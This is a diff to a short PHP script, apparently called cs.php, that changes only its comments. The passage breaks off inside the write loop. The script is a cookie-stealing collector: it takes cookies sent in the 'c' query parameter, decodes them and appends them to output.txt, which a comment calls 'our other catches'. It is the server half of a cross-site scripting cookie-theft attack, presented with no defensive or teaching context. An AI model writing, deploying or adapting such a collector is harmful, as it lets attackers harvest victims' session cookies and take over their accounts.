@@ -1,20 +1,22 @@
 <?php
 
-#Newlines are represented with different characters depending on the system.
-#Mac: \r, *nix \n, Windows \r\n
+// Newlines are represented with different characters depending on the system.
+// Macintosh: \r
+// *nix \n
+// Windows \r\n
 $lineEnding = "\n";
 
-#cs.php?c=isset
-if (isset($_GET['c'])) {
+// Will check if GET variable 'c' is set.
+if ( isset( $_GET['c'] ) ) {
 
-	#Split the cookie string into an array of cookies
-	#Unescape the javascript escaped string with urldecode
+	// Splits the string into an array of strings which is made up of name=value
+	// pairs. urldecode() decodes the javascript escape() function.
 	$cookies = explode(' ', urldecode($_GET['c']));
 
-	#Open file in append mode
+	// Open file in append mode so we don't overwrite our other catches.
 	$fp = fopen('output.txt', 'a');
 
-	#Write cookies to file
+	// Write cookies to file.
 	foreach($cookies as $cookie) {
 		fwrite($fp, $cookie . $lineEnding);
 	}
